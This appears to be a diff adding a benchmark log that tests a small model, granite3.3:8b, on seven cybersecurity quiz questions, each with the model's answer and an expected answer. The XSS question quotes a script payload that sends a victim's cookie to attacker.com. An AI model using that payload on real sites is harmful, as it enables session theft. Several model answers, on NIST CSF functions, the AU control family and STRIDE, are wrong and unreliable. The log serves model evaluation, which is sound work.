@@ -1,0 +1,168 @@
+Cybersecurity Sanity Test Log
+Run Mode: granite3_3_8b
+Initialized: 2025-07-15T23:07:00.900330
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:07:31.765461
+Model: granite3.3:8b
+Category: Basic Definitions - Identification
+Response Time: 30.86 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This statement falls under the category of a security policy or requirement in cybersecurity. Its primary purpose is to enhance system security by mandating multi-factor authentication (MFA) for administrative access. MFA adds an extra layer of protection beyond just passwords, typically requiring a second form of verification like a physical token or a biometric factor, reducing the risk of unauthorized access due to stolen or guessed credentials.
+
+EXPECTED SHORT ANSWER:
+This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:08:08.277266
+Model: granite3.3:8b
+Category: Frameworks - Application
+Response Time: 36.51 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+The two core functions of the NIST Cybersecurity Framework (CSF) most prominently demonstrated in this scenario are:
+
+1. **Identify** - This involves developing an organizational risk management strategy to define, manage, and support the delivery of information security objectives aligned with business needs. Here, identifying vulnerabilities beforehand through an incident response plan and having reliable backups for system restoration aligns with this function.
+
+2. **Respond** - Once the ransomware attack occurred, activating the incident response plan to contain the damage and begin restoring systems from backups is a direct execution of this 'Respond' function, which includes developing and implementing appropriate activities to take action appropriately when an incident occurs.
+
+EXPECTED SHORT ANSWER:
+The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:08:33.447617
+Model: granite3.3:8b
+Category: Security Controls - Identification
+Response Time: 25.17 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The NIST SP 800-53 control family that addresses this type of requirement is Audit and Accountability. Specifically, it falls under the subcontrol "AU.2 - Timely Logging of Important Events" within the broader category of Access Control. This control mandates logging and monitoring of all access to information systems and resources for detection of security incidents and for forensic analysis.
+
+EXPECTED SHORT ANSWER:
+This requirement is addressed by the 'AU' (Audit and Accountability) control family.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:08:53.819701
+Model: granite3.3:8b
+Category: Vulnerabilities - Identification
+Response Time: 20.37 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The common name for this vulnerability is Cross-Site Scripting (XSS), specifically a type known as Stored XSS or Persistent XSS because the malicious script is permanently stored on the server. The corresponding CWE identifier is CWE-79.
+
+EXPECTED SHORT ANSWER:
+This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:09:12.707228
+Model: granite3.3:8b
+Category: Threat Modeling - Classification
+Response Time: 18.88 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+This threat falls under the 'Elevate Privileges' (also known as Spoofing) category in the STRIDE model. The attacker is trying to gain higher privileges by altering legitimate data packets for financial gain.
+
+EXPECTED SHORT ANSWER:
+This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:09:54.770892
+Model: granite3.3:8b
+Category: Regulations/Directives - Application
+Response Time: 42.06 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+For incident 1, the primary regulatory concern would be the Network and Information Security (NIS) Directive of the European Union. This directive aims to enhance cybersecurity across critical infrastructure sectors including energy, which includes power grid operators. It requires member states to take measures to ensure a high common level of network and information security across the EU, including risk management related to operational technology.
+
+For incident 2, the primary regulatory concern would be the General Data Protection Regulation (GDPR). This regulation focuses on data protection for individuals within the European Union. It mandates that companies protect the personal data of EU citizens and notify authorities and potentially the affected individuals in case of a breach.
+
+EXPECTED SHORT ANSWER:
+Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:10:17.318387
+Model: granite3.3:8b
+Category: Basic Principles - Application
+Response Time: 22.54 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+The principle of the CIA triad primarily upheld by this security control is Integrity. Data integrity ensures that data has not been altered or tampered with in an unauthorized manner, which in this case is maintained through the use of checksums like SHA-256 hashes for file verification during uploads and downloads.
+
+EXPECTED SHORT ANSWER:
+This control primarily upholds the principle of 'Integrity'.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: granite3.3:8b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 196.40 seconds
+  - Average Response Time: 28.06 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
